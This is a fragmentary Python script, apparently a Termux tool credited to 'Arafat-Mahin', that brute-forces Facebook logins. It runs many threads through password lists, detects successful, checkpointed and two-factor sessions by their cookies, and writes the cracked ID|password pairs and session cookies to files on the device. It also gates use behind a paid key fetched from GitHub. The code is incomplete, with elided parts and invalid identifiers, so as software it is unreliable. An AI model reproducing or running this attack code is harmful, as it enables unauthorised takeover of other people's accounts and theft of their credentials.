...
logo=("""\033[38;5;195m
                      ...
                      __   _______            __  __       _     _ _   _ 
     /\              / _| |__   __|          |  \/  |     | |   (_) \ | |
    /  \   _ __ __ _| |_ __ _| |     ______  | \  / | __ _| |__  _|  \| |
   / /\ \ | '__/ _` |  _/ _` | |    |______| | |\/| |/ _` | '_ \| | . ` |
  / ____ \| | | (_| | || (_| | |             | |  | | (_| | | | | | |\  |
 /_/    \_\_|  \__,_|_| \__,_|_|             |_|  |_|\__,_|_| |_|_|_| \_|
                                                                         
                                                                         
\033[1;32m-----------------------------------------------------
\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] ADMIN       : Arafat-Mahin
...
Arafat-Mahin="Arafat-Mahin-SETU"
...
try:
    ...
    kok.write(myid+Arafat-Mahin)
    kok.close()
def Subscraption():
    key1=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
    os.system('clear')
    print(logo)
    r1=requests.get("https://raw.githubusercontent.com/Arafat-Mahin-CYBER-143/Arafat-Mahin-PRO/main/Key.txt").text
    if key1 in r1:
        os.system('clear')
        print(logo)
        main_menu()
        ...
        os.system("clear")
        print(logo)
        print ("\033[38;5;196m[\033[1;32m+\033[38;5;196m]\033[1;32m Your Key : "+Arafat-Mahin+key1)
        input("\033[38;5;196m[\033[1;32m+\033[38;5;196m]\033[1;32m\033[1;32m Enter To Send Key")
        time.sleep(3.5)
        tks = 'DEAR%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20CRACK-FILE%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20'+Arafat-Mahin+''+key1
...
def gmail():
    ...
    with ThreadPool(max_workers=30) as setu:
        ...
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;46m/SDCARD/Arafat-Mahin-OK.txt')
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;196m/SDCARD/Arafat-Mahin-CP.txt')
        print(tn)
        for guru in user:
...
def beeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[38;5;195m[Arafat-Mahin-XD\033[38;5;195m] %s|OK-\033[38;5;46m%s\r'%(loop,len(ok))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[38;5;46m[Arafat-Mahin-OK] '+uid+'|'+ps+' âˆš '+roksana(uid)+'\n\033[38;5;195m[\033[1;35mCOOKIE\033[38;5;195m] \033[1;34m'+coki+'')
                ok.append(uid)
                open('/sdcard/Arafat-Mahin-X-OK.txt', 'a').write(uid+' | '+ps+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'\033[38;5;206m[Arafat-Mahin-CP] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')
                open('/sdcard/Arafat-Mahin-X-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cp.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'\033[38;5;208m[Arafat-Mahin-2F] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')
                open('/sdcard/Arafat-Mahin-X-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(uid)
                break
            else:
                continue
